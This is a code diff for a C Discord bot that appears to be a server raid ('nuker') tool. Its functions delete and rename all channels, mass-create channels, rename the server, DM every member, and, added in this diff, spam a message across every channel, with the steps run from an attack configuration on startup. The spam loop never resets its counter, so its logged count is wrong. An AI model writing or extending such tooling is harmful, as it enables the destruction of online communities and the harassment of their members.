@@ -57,7 +57,7 @@ void mass_channel(struct discord *client, u64_snowflake_t guild_id,
         discord_create_guild_channel(client, guild_id, &chn_params, NULL);
     }
 
-    log_info("Created %d channels in %" PRIu64, i+1, guild_id);
+    log_info("Created %d channels in %" PRIu64, i + 1, guild_id);
 }
 
 void guild_name(struct discord *client, u64_snowflake_t guild_id,
@@ -109,7 +109,7 @@ void dm_all(struct discord *client, u64_snowflake_t guild_id,
                 .content = d_message},
             NULL);
     }
-    log_info("Sent message to %d users in %" PRIu64, i+1, guild_id);
+    log_info("Sent message to %d users in %" PRIu64, i + 1, guild_id);
 }
 
 void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
@@ -124,7 +124,7 @@ void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
         discord_delete_channel(client, channels[i]->id, NULL);
         i++;
     }
-    log_info("Deleted %d channels in %" PRIu64, i+1, guild_id);
+    log_info("Deleted %d channels in %" PRIu64, i + 1, guild_id);
 }
 
 void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
@@ -147,7 +147,7 @@ void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
         i++;
     }
 
-    log_info("Renamed %d channels in % --> \"%s\"" PRIu64, i+1, guild_id, channel_name);
+    log_info("Renamed %d channels in % --> \"%s\"" PRIu64, i + 1, guild_id, channel_name);
 }
 
 void change_nickname(struct discord *client, u64_snowflake_t guild_id, u64_snowflake_t user_id,
@@ -160,6 +160,31 @@ void change_nickname(struct discord *client, u64_snowflake_t guild_id, u64_snowf
         &(struct discord_modify_guild_member_params){
             .nick = _nickname},
         NULL);
+}
+
+void spam_messages(struct discord *client, u64_snowflake_t guild_id,
+                   char _message[2000], int amount)
+{
+    char *message = strtok(_message, "");
+    struct discord_channel **channels;
+
+    discord_get_guild_channels(client, guild_id, &channels);
+
+    int i = 0;
+    for (int x = 0; x <= amount; x++)
+    {
+        while (channels[i])
+        {
+            discord_create_message(
+                client,
+                channels[i]->id,
+                &(struct discord_create_message_params){
+                    .content = message},
+                NULL);
+            i++;
+        }
+    }
+    log_info("Sent %d messages in %" PRIu64, amount*i, guild_id);
 }
 
 void on_ready(struct discord *client)
@@ -194,6 +219,11 @@ void on_ready(struct discord *client)
         change_nickname(client, guild_id, bot->id, s_attack.nickname_name);
     }
 
+    if (s_attack.guild_name_enabled == true)
+    {
+        guild_name(client, guild_id, s_attack.guild_name);
+    }
+
     if (s_attack.channel_delete_all == true)
     {
         delete_all_channels(client, guild_id);
@@ -209,9 +239,9 @@ void on_ready(struct discord *client)
         mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count, s_attack.mass_channel_type);
     }
 
-    if (s_attack.guild_name_enabled == true)
+    if (s_attack.send_message_enabled == true)
     {
-        guild_name(client, guild_id, s_attack.guild_name);
+        spam_messages(client, guild_id, s_attack.send_message_message, s_attack.send_message_amount);
     }
 
     if (s_attack.dm_all_enabled == true)
